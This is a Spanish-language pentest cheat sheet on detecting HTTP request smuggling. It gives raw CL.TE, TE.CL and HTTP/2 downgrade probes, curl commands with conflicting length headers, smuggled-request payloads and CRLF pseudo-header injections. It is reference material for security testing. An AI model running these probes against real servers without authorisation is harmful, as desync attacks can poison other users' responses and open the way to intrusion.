---
aliases:
  - HRS Detection
  - Smuggling Probes
tags:
  - type/technique
  - vuln/http-smuggling
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[HTTP Request Smuggling]]"
---
# HTTP Request Smuggling - Detección

***

## Probes Timing-based

| **Variante** | **Probe** | **Indicador** |
|:---:|:---:|:---:|
| **CL.TE delay** | `POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA\r\nX` | Timeout en respuesta → back-end espera más bytes (TE chunked sin terminator). |
| **TE.CL delay** | `POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX` | Timeout → back-end CL espera 6 bytes pero sólo recibe los del chunked. |
| **TE.TE delay** | TE válido + TE ofuscado (`Transfer-Encoding: cow` u otra variante) | Timeout dependiendo de cuál servidor lee cuál header. |
| **Calibración baseline** | Request normal sin trick | Medir tiempo base — diferencias < 1s no son confiables. |
| **Burp Smuggler probe** | Extension `HTTP Request Smuggler` → `Smuggle Probe` | Auto-genera variantes timing. |
| **Turbo Intruder timing** | Script con `engine=Engine.BURP` y `pipeline=False` | Reproducible. |
| **Validación con CONNECT** | Algunos backends responden distinto a CONNECT | Confirma que hay proxy chain. |
| **Validación de Connection: close** | Forzar `Connection: close` → responses obvian queue | Si timing cambia drásticamente → multi-server arch. |
^hrs-detect-timing

### Snippets curl probes

```bash
# CL.TE probe (timeout esperado si vulnerable)
curl -v --http1.1 --max-time 5 \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  --data-binary $'1\r\nA\r\nX' \
  https://target/

# TE.CL probe
curl -v --http1.1 --max-time 5 \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\nX' \
  https://target/
```

___

## Differential Response Detection

| **Técnica** | **Payload** | **Indicador** |
|:---:|:---:|:---:|
| **CL.TE confirm** | Smuggle 2do request `GET /404 HTTP/1.1\r\nHost: target\r\n\r\n` | Próximo legit request recibe 404 inesperado. |
| **TE.CL confirm** | Smuggle response que asocia a próxima request | 2 requests → 1 response perdida o intercambiada. |
| **Status code differential** | Smuggled request con path inválido | Próxima request respondida con status del smuggle. |
| **Response body differential** | Smuggled request con body que aparece en response del próximo user | Confirmación visual. |
| **Self-poison** | 2 requests del mismo cliente — segundo pisa el primero | Self-test seguro (no afecta otros). |
| **Length tracking** | Server devuelve Content-Length distinto del esperado | Length mismatch indica desync. |
| **Connection reuse forzado** | `Connection: keep-alive` + 2 requests pipelined | Necesario para que la smuggled request quede en queue. |
| **Probe con header inyectado** | Smuggle `X-Smuggle-Test: 1` → próximo response refleja ese header en logs/errors | Si app loguea headers en error pages, confirmás. |
| **Burp Repeater "Send group" (single connection)** | Permite enviar múltiples requests por la misma TCP conn | Setup obligatorio para probar HRS. |
^hrs-detect-differential

### Auto-detección con extension

```
Burp → HTTP Request Smuggler (extension):
1. Right-click request → "Smuggle probe"
2. Tool prueba CL.TE, TE.CL, TE.TE, CL.CL automáticamente
3. Reporta timing diffs significativos como likely-vulnerable
4. "Smuggle attack" panel para crafting manual después
```

___

## HTTP/2 Endpoint Detection

| **Objetivo** | **Comando** | **Indicador** |
|:---:|:---:|:---:|
| Detectar HTTP/2 | `curl -v --http2 https://target/` | Response con `HTTP/2 200`. |
| Detectar ALPN h2 | `openssl s_client -alpn h2 -connect target:443` | Negociación ALPN exitosa con `h2`. |
| H2 over cleartext (h2c) | `curl -v --http2-prior-knowledge http://target:80/` | Si responde HTTP/2 sin TLS → h2c. |
| Forzar H2 frontend + H1 backend | Mandar request HTTP/2 con header forbidden en H1 | Si response normal → frontend traduce a H1 (downgrade activo). |
| Detectar hop-by-hop forwarding | `Transfer-Encoding`, `Connection`, `Keep-Alive` headers | RFC 7540 prohíbe en H2 — si el back-end H1 los recibe → desync potencial. |
| Probe `:method` injection | H2 request con `\r\n` en value de pseudo-header | Si frontend rejecta → strict; si forwarda → desync por request line injection. |
| Probe `:path` con CRLF | `:path: /\r\nX-Smuggled: 1` | Mismo concepto. |
| H2c smuggling probe | `Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c` | Si frontend no rejecta upgrade → h2cSmuggler aplica. |
| Burp HTTP/2 panel | "Inspector → Pseudo-headers" en Repeater | Editor para H2 raw. |
| Raw H2 con nghttp2 | `nghttp -v https://target/` | Cliente CLI low-level. |
^hrs-detect-h2

### Detección H2.CL / H2.TE

```
1. Enviar HTTP/2 request con header `Content-Length: 0` y body de 6 bytes:
   - Si frontend reescribe correcto → response normal
   - Si frontend mantiene CL=0 y forwarda body → back-end H1 lee body como nuevo request → desync H2.CL

2. Enviar HTTP/2 request con `Transfer-Encoding: chunked`:
   - RFC 7540 prohíbe — frontend conformante rejecta
   - Frontend que forwarda → back-end H1 procesa TE → desync H2.TE
```

***
